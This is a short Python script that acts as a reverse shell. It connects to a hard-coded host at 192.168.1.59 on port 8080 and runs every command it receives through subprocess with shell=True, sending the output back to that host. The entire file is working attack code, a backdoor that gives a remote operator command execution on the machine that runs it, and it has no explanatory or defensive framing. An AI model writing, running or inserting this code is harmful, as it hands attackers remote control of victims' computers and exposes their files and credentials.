import socket
import subprocess

def command_interaction(command):
    return subprocess.check_output(command, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.1.59", 8080))

connection.send(b"connection ok\n")

while True:
    command = connection.recv(1024)
    command_output = command_interaction(command)
    connection.send(command_output)


connection.close()
